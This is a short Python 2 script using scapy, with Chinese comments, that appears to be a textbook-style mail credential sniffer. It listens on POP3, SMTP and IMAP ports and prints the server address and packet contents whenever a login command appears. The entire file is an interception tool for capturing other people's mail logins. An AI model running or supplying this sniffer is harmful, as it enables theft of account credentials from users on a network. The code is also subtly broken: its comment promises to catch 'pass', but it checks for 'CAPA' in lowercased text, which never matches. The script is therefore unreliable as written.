#-*-coding:utf-8-*-
from scapy.all import *

#定义一个回调函数
def packet_callback(packet):
    
    mail_packer = str(packet[TCP].payload)
    #如果嗅探到有user跟pass出现，就打出目的IP跟实际内容
    if "user" in mail_packer.lower() or "CAPA" in mail_packer.lower():
        print "[*] Server:%s" % packet[IP].dst
        print "[*] %s" % packet[TCP].payload
    
    
#fileer过滤器，只嗅探110(pop3) 25(smtp) 143(imap)
#store表示不在内存保存数据包
sniff(filter="tcp port 110 or tcp port 25 or tcp port 143",prn=packet_callback ,store=0)